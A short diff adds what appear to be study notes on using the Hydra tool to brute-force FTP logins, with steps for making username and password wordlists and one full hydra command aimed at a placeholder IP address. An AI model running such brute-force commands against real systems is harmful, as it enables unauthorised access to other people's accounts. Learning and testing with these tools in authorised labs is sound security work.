@@ -1,0 +1,8 @@
+Using Hydra as an exploitation tool
+To exploit ftp
+1.	create a file username.txt
+2.	nano the file with possible usernames
+3.	create a file password.txt
+4.	nano the file with possible passwords
+hydra -L /home/kali/Downloads/username.txt -P /home/kali/Downloads/password.txt (ip address) ftp -V
+
